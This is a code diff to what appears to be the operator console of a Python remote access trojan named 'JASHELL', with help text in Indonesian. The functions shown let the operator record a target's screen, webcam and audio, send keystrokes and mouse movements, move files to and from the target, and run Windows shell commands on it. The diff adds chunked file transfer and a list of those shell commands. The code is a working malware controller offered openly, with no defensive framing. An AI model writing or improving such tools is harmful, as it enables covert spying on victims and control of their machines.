@@ -116,7 +116,7 @@ def screen_record(host="0.0.0.0", port=9999):
             while len(data) < payload_size:
                 packet = conn.recv(4096)
                 if not packet:
-                    return
+                    return 
                 data += packet
 
             packed_size = data[:payload_size]
@@ -184,25 +184,28 @@ def stream_cam():
      t.start()
 
 def upload_file(namafile):
-     file = open(namafile, 'rb')
-     _target.send(file.read())
-     file.close()
+     bufsize = 65536
+     filesize = os.path.getsize(namafile)
+     _target.sendall(struct.pack("Q", filesize))
+     with open(namafile, 'rb') as f:
+        while True:
+            data = f.read(bufsize)
+            if not data:
+                break
+            _target.sendall(data)  
 
 def download_file(namafile):
-     file = open(namafile, 'wb')
-     _target.settimeout(1)
-     _file = _target.recv(65536*100)
-     while _file:
-          print(Fore.GREEN+'downloading')
-          file.write(_file)
-          try:
-               file = _target.recv(65536*100)
-          except socket.timeout as e:
-               print(Fore.CYAN+'downloaded')
-               break
-
-     _target.settimeout(None)
-     file.close()
+     bufsize = 65536
+     size_data = _target.recv(8)
+     filesize = struct.unpack("Q", size_data)[0]
+     recv = 0
+     with open(namafile, 'wb') as file:
+        while recv < filesize:
+                data = _target.recv(bufsize)
+                if not data:
+                    break
+                file.write(data)
+                recv += len(data)
 
 def data_diterima():
         data = ''
@@ -213,7 +216,7 @@ def data_diterima():
             except ValueError:
                  continue
 
-def shellc():
+def shellc():                      
     n = 0
     print(Fore.BLUE+"Type 'help' for help")
     while True:
@@ -317,11 +320,31 @@ def shellc():
                    -send_mouse >> menggerakan kursor
                    ================================ 
                    
+                     windows system command:
+                   =================================
+                   -cd        >> berpindah direktori
+
+                   -mkdir     >> membuat direktori
+                   
+                   -rmdir     >> menghapus direktori
+                   
+                   -del       >> menghapus file 
+                   
+                   -whoami    >> nama user
+                   
+                   -dir       >> melihat list file/direktori
+                   
+                   -copy      >> memindahkan file ke direktori lain
+                   
+                   -ren       >> mengubah nama file
+                   
+                   -type      >> menampilkan isi file
+                   ================================= 
                    """)
         elif perintah == 'rec_audio':
              receive_and_save()
         elif perintah == 'banner':
-             list_banner = [pyfiglet.figlet_format('JASHELL', font='slant'), pyfiglet.figlet_format('SHELL', font='3-d'), pyfiglet.figlet_format('JASHELL', font='standard'), pyfiglet.figlet_format('SHELL', font='banner')]
+             list_banner = [pyfiglet.figlet_format('SHELL', font='slant'), pyfiglet.figlet_format('SHELL', font='3-d'), pyfiglet.figlet_format('SHELL', font='standard'), pyfiglet.figlet_format('SHELL', font='banner')]
              choice = random.choice(list_banner)
              print(choice)
         elif perintah == 'send_key':
